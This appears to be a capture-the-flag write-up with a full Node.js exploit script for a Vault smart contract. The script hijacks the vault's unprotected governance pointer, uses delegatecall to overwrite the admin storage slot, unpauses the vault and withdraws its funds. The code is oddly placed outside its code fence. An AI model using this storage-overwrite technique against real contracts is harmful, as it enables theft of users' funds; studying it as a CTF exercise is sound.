# web3 - Heist v1

Solved by: p5yd4wk

This challenge involves exploiting a smart contract vulnerability in a Vault contract that uses delegatecall to execute functions from a Governance contract. The goal is to drain all funds from the vault by becoming the admin and unpausing the contract.
this is the cool script i use to exploit the contract
```

```
what it does:

Drop malicious contract with a function that writes  to slot 1 (where admin is stored).
Point Vault's governance to this contract (no access control).
Call execute() with the malicious function which overwrites admin function with my address
Call execute() with setProposal(0) which unpauses the vault
withdraw all funds as the new admin :3
flag: `EH4X{c4ll1ng_m4d3_s000_e45y_th4t_my_m0m_d03snt_c4ll_m3}`
const { ethers } = require("ethers");
const net = require("net");

const HOST = "135.235.193.111";
const PORT = 1337;

const VAULT_ABI = [
  "function execute(bytes calldata data)",
  "function withdraw()",
  "function setGovernance(address _g)",
  "function getBalance() view returns(uint256)",
  "function isSolved() view returns(bool)",
  "function paused() view returns(bool)",
  "function admin() view returns(address)",
];

const EXPLOIT_IFACE = new ethers.Interface([
  "function setProposal(uint256 x)",
  "function setAdmin(address a)",
]);

// ── compile Exploit.sol with solc-js ──
function compileExploit() {
  const solc = require("solc");
  const src = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract Exploit {
    uint256 public slot0;
    function setProposal(uint256 x) public { slot0 = x; }
    function setAdmin(address a) public { assembly { sstore(1, a) } }
}`;
  const input = {
    language: "Solidity",
    sources: { "E.sol": { content: src } },
    settings: { outputSelection: { "*": { "*": ["abi", "evm.bytecode"] } } },
  };
  const out = JSON.parse(solc.compile(JSON.stringify(input)));
  if (out.errors?.some((e) => e.severity === "error"))
    throw new Error(out.errors.map((e) => e.message).join("\n"));
  const c = out.contracts["E.sol"]["Exploit"];
  return { abi: c.abi, bytecode: "0x" + c.evm.bytecode.object };
}

// ── tiny socket wrapper ──
class Conn {
  constructor(sock) {
    this.sock = sock;
    this.buf = "";
    this._cbs = [];
    sock.on("data", (chunk) => {
      const t = chunk.toString();
      this.buf += t;
      process.stdout.write(t);
      this._cbs.forEach((cb) => cb());
    });
  }

  static connect(host, port) {
    return new Promise((res, rej) => {
      const sock = new net.Socket();
      sock.connect(port, host, () => res(new Conn(sock)));
      sock.on("error", rej);
    });
  }

  waitFor(pattern, ms = 60000) {
    return new Promise((res, rej) => {
      if (this.buf.includes(pattern)) return res(this.buf);
      const cb = () => {
        if (this.buf.includes(pattern)) {
          this._cbs.splice(this._cbs.indexOf(cb), 1);
          clearTimeout(t);
          res(this.buf);
        }
      };
      this._cbs.push(cb);
      const t = setTimeout(() => {
        this._cbs.splice(this._cbs.indexOf(cb), 1);
        rej(new Error("timeout waiting for: " + pattern));
      }, ms);
    });
  }

  send(data) { this.sock.write(data); }

  readFor(ms = 5000) {
    return new Promise((res) => setTimeout(() => res(this.buf), ms));
  }

  close() { this.sock.destroy(); }
}

// ── rpc connect with retries ──
async function rpcConnect(url, retries = 20) {
  for (let i = 1; i <= retries; i++) {
    try {
      const p = new ethers.JsonRpcProvider(url);
      await p.getBlockNumber();
      return p;
    } catch {
      console.log(`[*] Waiting for RPC (${i}/${retries})...`);
      await new Promise((r) => setTimeout(r, 2000));
    }
  }
  throw new Error("RPC unreachable");
}

// ── main ──
async function main() {
  // 1. connect to CTF and wait for setup
  console.log("[*] Connecting...");
  const conn = await Conn.connect(HOST, PORT);
  await conn.waitFor("Exit", 120000);
  console.log("\n");

  // 2. parse
  const rpcUrl   = conn.buf.match(/RPC URL\s*:\s*(http[^\s\n]+)/)?.[1];
  const vaultAddr = conn.buf.match(/Vault\s*:\s*(0x[a-fA-F0-9]{40})/)?.[1];
  const pk        = conn.buf.match(/Private Key:\s*(0x[a-fA-F0-9]{64})/)?.[1];
  if (!rpcUrl || !vaultAddr || !pk) throw new Error("parse failed:\n" + conn.buf);

  console.log(`[+] RPC:   ${rpcUrl}`);
  console.log(`[+] Vault: ${vaultAddr}`);

  // 3. connect to chain
  const provider = await rpcConnect(rpcUrl);
  const wallet = new ethers.Wallet(pk, provider);
  const vault = new ethers.Contract(vaultAddr, VAULT_ABI, wallet);
  console.log(`[+] Wallet: ${wallet.address}`);
  console.log(`[*] Balance: ${ethers.formatEther(await vault.getBalance())} ETH`);
  console.log(`[*] Paused:  ${await vault.paused()}`);
  console.log(`[*] Admin:   ${await vault.admin()}`);

  // 4. compile & deploy exploit
  console.log("[*] Compiling exploit...");
  const { abi, bytecode } = compileExploit();
  console.log("[*] Deploying...");
  const exploit = await (await new ethers.ContractFactory(abi, bytecode, wallet).deploy()).waitForDeployment();
  const exploitAddr = await exploit.getAddress();
  console.log(`[+] Exploit: ${exploitAddr}`);

  // 5. pwn
  console.log("[*] setGovernance → exploit");
  await (await vault.setGovernance(exploitAddr)).wait();

  console.log("[*] delegatecall setAdmin → become admin");
  await (await vault.execute(EXPLOIT_IFACE.encodeFunctionData("setAdmin", [wallet.address]))).wait();

  console.log("[*] delegatecall setProposal(0) → unpause");
  await (await vault.execute(EXPLOIT_IFACE.encodeFunctionData("setProposal", [0]))).wait();

  console.log("[*] withdraw()");
  await (await vault.withdraw()).wait();

  // 6. verify
  const solved = await vault.isSolved();
  console.log(`\n[+] isSolved: ${solved}`);

  if (!solved) { console.log("[-] Failed"); conn.close(); return; }

  // 7. tell server to check, get flag
  console.log("[*] Checking with server...\n");
  conn.send("1\n");
  await conn.readFor(5000);

  conn.close();
  console.log("\n[*] Done");
}

main().catch((e) => { console.error("\n[-] Fatal:", e.message); process.exit(1); });

Solved by: yappare